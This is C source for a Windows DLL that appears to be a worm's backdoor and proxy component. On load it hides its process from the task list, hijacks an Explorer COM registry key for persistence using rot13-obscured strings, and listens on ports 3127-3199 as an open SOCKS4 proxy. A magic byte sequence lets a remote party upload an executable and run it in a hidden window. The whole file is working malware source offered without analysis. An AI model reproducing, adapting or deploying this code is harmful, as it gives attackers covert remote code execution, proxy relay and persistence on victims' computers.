#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <stdio.h>

/* UPX refuses to pack this dll without padding :( */
const char PAD1[] =
	"SYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNC"
	"SYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNC"
	"SYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNC"
	"SYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNC"
	"SYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNC"
	"SYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNC"
	"SYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNC"
	"SYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNC"
	"SYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNC"
	"SYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNC"
	"SYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNC"
	"SYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNC"
	"SYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNC";

#define SOCKS4_SUCCEEDED 90
#define SOCKS4_REJECTED  91
#define SOCKS4_EXECBYTE  133

#pragma pack(push, 1)
struct socks4_header {
	unsigned char vn;		/* VN: version number, 0x04 */
	unsigned char cd;		/* CD: command/reply code */
	unsigned short dstport;
	unsigned long dstip;
};
#pragma pack(pop)

int usedthreads, threadscnt;
HINSTANCE hDllInstance;

static int recv_bytes(int sock, char *buf, int len, int opt)
{
	register int i, p;
	for (p=0; p<len;) {
		i = recv(sock, buf+p, len-p, opt);
		if (i < 0) return i;
		if (i == 0) return p;
		p += i;
	}
	return p;
}

static int skip_until(int sock, char c)
{
	char r;
	for (;;) {
		if (recv(sock, &r, 1, 0) != 1) return 1;
		if (r == c) return 0;
	}
}

static void sends(int sock, char *s) { send(sock, s, lstrlen(s), 0); }

static void socks4_exec(int sock)
{
	int i, j;
	HANDLE hFile=NULL;
	char temppath[MAX_PATH], tempfile[MAX_PATH], buf[1024];
	DWORD dw;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	recv(sock, (char *)&dw, 1, 0);		/* skip header byte */

	recv(sock, (char *)&dw, 4, 0);
	dw = ntohl(dw);
	if (dw != 0x133C9EA2) goto drop;

	GetTempPath(sizeof(temppath), temppath);
	GetTempFileName(temppath, "tmp", 0, tempfile);
	hFile = CreateFile(tempfile, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == NULL || hFile == INVALID_HANDLE_VALUE) {
		hFile = NULL;
		goto drop;
	}

	for (i=0;;) {
		j = recv(sock, buf, sizeof(buf), 0);
		if (j <= 0) break;
		i += j;
		WriteFile(hFile, buf, j, &dw, 0);
	}
	CloseHandle(hFile);

	memset(&si, '\0', sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_FORCEOFFFEEDBACK | STARTF_USEPOSITION |
		STARTF_USESHOWWINDOW | STARTF_USESIZE;
	si.dwX = si.dwY = 0;
	si.dwXSize = si.dwYSize = 1;
	si.wShowWindow = SW_HIDE;
	wsprintf(buf, "\"%s\"", tempfile);
	if (CreateProcess(NULL, buf, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi) == 0)
		goto drop;
	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	DeleteFile(tempfile);
	closesocket(sock);		/* socket will be closed on termination */
	return;

drop:	closesocket(sock);
	if (hFile != NULL) DeleteFile(tempfile);
	return;
}

static int parse_socks4a(int sock, unsigned long *ip)
{
	char hostname[300];
	unsigned long i;
	struct hostent *h;

	for (i=0; i<255; i++) {
		if (recv(sock, hostname+i, 1, 0) <= 0) return 1;
		if (hostname[i] == 0) break;
	}
	i = inet_addr(hostname);
	if (i != 0 && i != 0xFFFFFFFF) {
		*ip = i;
	} else {
		if ((h = gethostbyname(hostname)) == NULL)
			return 1;
		*ip = *(unsigned long *)h->h_addr_list[0];
	}
	return 0;
}

static void relay_socks(int sock1, int sock2)
{
	struct fd_set fds;
	char buf[4096];
	register int i;

	for (;;) {
		FD_ZERO(&fds);
		FD_SET(sock1, &fds);
		FD_SET(sock2, &fds);
		if (select(0, &fds, NULL, NULL, NULL) <= 0) break;
		if (FD_ISSET(sock1, &fds)) {
			if ((i = recv(sock1, buf, sizeof(buf), 0)) <= 0) break;
			send(sock2, buf, i, 0);
		}
		if (FD_ISSET(sock2, &fds)) {
			if ((i = recv(sock2, buf, sizeof(buf), 0)) <= 0) break;
			send(sock1, buf, i, 0);
		}
	}
}

static void socks4_client(int sock)
{
	struct socks4_header h;
	struct sockaddr_in addr;
	int relay=INVALID_SOCKET;
	unsigned char c;

	if (recv(sock, &c, 1, MSG_PEEK) != 1) goto ex;
	if (c == SOCKS4_EXECBYTE) {
		socks4_exec(sock);
		closesocket(sock);
		return;
	}
	if (c != 0x04) goto reject;

	if (recv_bytes(sock, (char *)&h, sizeof(h), 0) != sizeof(h)) goto ex;
	if (skip_until(sock, '\0')) goto reject;
	if (h.vn != 0x04) goto reject;
	if (h.cd != 0x01) goto reject;		/* BIND method is not supported */

	if ((h.dstip != 0) && ((htonl(h.dstip) & 0xFFFFFF00) == 0))	/* 0.0.0.xxx, xxx!=0 */
		/* SOCKS4A extension... */
		if (parse_socks4a(sock, &h.dstip)) goto reject;
	addr.sin_family = AF_INET;
	addr.sin_port = h.dstport;
	addr.sin_addr.s_addr = h.dstip;

	relay = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (relay == INVALID_SOCKET) goto reject;
	if (connect(relay, (struct sockaddr *)&addr, sizeof(addr))) goto reject;

	h.vn = 0x04;
	h.cd = SOCKS4_SUCCEEDED;	/* success */

	send(sock, (char *)&h, sizeof(h), 0);

	relay_socks(sock, relay);

ex:	if (relay != INVALID_SOCKET) closesocket(relay);
	closesocket(sock);
	return;

reject:	h.vn = 0x04;
	h.cd = SOCKS4_REJECTED;	/* rejected/failed */
	send(sock, (char *)&h, sizeof(h), 0);
	goto ex;
}

DWORD _stdcall socks4_server_th(LPVOID pv)
{
	int sock, serv=(int)pv;
	DWORD tick=0;
	for (;;) {
		sock = accept(serv, NULL, NULL);
		if (sock == 0 || sock == INVALID_SOCKET) continue;
		usedthreads++;
		socks4_client(sock);
		usedthreads--;
		if ((GetTickCount() - tick) < 20)
			Sleep(50);
		tick = GetTickCount();
	}
	//ExitThread(0);
	//return 0;
}

void shellsvc_attach(void);

int socks4_main(int port, int initthreads)
{
	int serv, i;
	unsigned long tid;
	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = 0;
	addr.sin_port = htons(port);
	serv = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (serv == INVALID_SOCKET) return 1;
	if (bind(serv, (struct sockaddr *)&addr, sizeof(addr))) {
		closesocket(serv);
		return 2;
	}
	if (listen(serv, SOMAXCONN)) {
		closesocket(serv);
		return 3;
	}
	for (i=0; i<initthreads; i++)
		CreateThread(0, 0, socks4_server_th, (LPVOID)serv, 0, &tid);
	threadscnt=initthreads;
	usedthreads = 0;
	for (;;) {
		Sleep(300);
		if (usedthreads >= (threadscnt-2)) {
			CreateThread(0, 0, socks4_server_th, (LPVOID)serv, 0, &tid);
			threadscnt++;
		}
		if ((GetTickCount() % 500) == 0)
			shellsvc_attach();
	}
}

//-----------------------------------------------------------------------------

char *xstrchr(const char *str, char ch)
{
	while (*str && *str != ch) str++;
	return (*str == ch) ? (char *)str : NULL;
}

char rot13c(char c)
{
	char u[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
	char l[] = "abcdefghijklmnopqrstuvwxyz";
	char *p;

	if ((p = xstrchr(u, c)) != NULL)
		return u[((p-u) + 13) % 26];
	else if ((p = xstrchr(l, c)) != NULL)
		return l[((p-l) + 13) % 26];
	else
		return c;
}

void rot13(char *buf, char *in)
{
	while (*in)
		*buf++ = rot13c(*in++);
	*buf = 0;
}

static void wsainit(void)
{
	WSADATA wd;
	WSAStartup(MAKEWORD(2,0), &wd);
}

//-----------------------------------------------------------------------------

typedef DWORD (WINAPI *PREGSERVICEPROCESS)(DWORD,DWORD);

void regsvc9x()
{
	PREGSERVICEPROCESS RegServProc;
	HINSTANCE hKernel32;
	char tmp[32];
	static const char szKernel32[] = "kernel32.dll";

	/* "RegisterServiceProcess" */
	rot13(tmp, "ErtvfgreFreivprCebprff");

	hKernel32 = GetModuleHandle(szKernel32);
	if (hKernel32 == NULL || hKernel32 == INVALID_HANDLE_VALUE)
		hKernel32 = LoadLibrary(szKernel32);
	if (hKernel32 != NULL && hKernel32 != INVALID_HANDLE_VALUE) {
		RegServProc = (PREGSERVICEPROCESS)GetProcAddress(hKernel32, tmp);
		if (RegServProc != NULL)
			RegServProc(0, 1);
	}
}

static void reg_setval(HKEY root, const char *path, const char *valname, const char *val)
{
	HKEY k;
	if (RegOpenKeyEx(root, path, 0, KEY_WRITE, &k) != 0)
		if (RegCreateKeyEx(root, path, 0, NULL, 0, KEY_WRITE, NULL, &k, NULL) != 0)
			return;
	RegSetValueEx(k, valname, 0, REG_SZ, (LPBYTE)val, lstrlen(val)+1);
	RegCloseKey(k);
}

void shellsvc_attach()
{
	char tmp[128], dllpath[256];
	MEMORY_BASIC_INFORMATION mbi;

	if (VirtualQuery(&shellsvc_attach, &mbi, sizeof(mbi)) == 0) return;
	memset(dllpath, 0, sizeof(dllpath));
	GetModuleFileName((HMODULE)mbi.AllocationBase, dllpath, sizeof(dllpath));

	/* CLSID\{35CEC8A3-2BE6-11D2-8773-92E220524153}\InprocServer32 - Explorer's stobject.dll */
//	rot13(tmp, "PYFVQ\\{35PRP8N3-2OR6-11Q2-8773-92R220524153}\\VacebpFreire32");
//	reg_setval(HKEY_CLASSES_ROOT, tmp, NULL, dllpath);

	/* CLSID\{E6FB5E20-DE35-11CF-9C87-00AA005127ED}\InprocServer32  - Explorer's Webcheck.dll */
	rot13(tmp, "PYFVQ\\{R6SO5R20-QR35-11PS-9P87-00NN005127RQ}\\VacebpFreire32");
	reg_setval(HKEY_CLASSES_ROOT, tmp, NULL, dllpath);
}

DWORD _stdcall xproxy_th(LPVOID pv)
{
	int port;
	regsvc9x();
	wsainit();
	shellsvc_attach();

/* actually, this piece of code will try ports 3127 - 3199 */

	for (port=3127;;port++) {
		socks4_main(port, 3);
		Sleep(1024);
		if (port > 3198) {
			Sleep(2048);
			port = 3127;
		}
	}
}

int APIENTRY DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)
{
	DWORD tmp;
	switch (dwReason) {
		case DLL_PROCESS_ATTACH:
			hDllInstance = hinstDLL;
			CreateThread(0, 0, xproxy_th, NULL, 0, &tmp);
			return 1;

		case DLL_PROCESS_DETACH:
		default:
			return 1;
	}
}
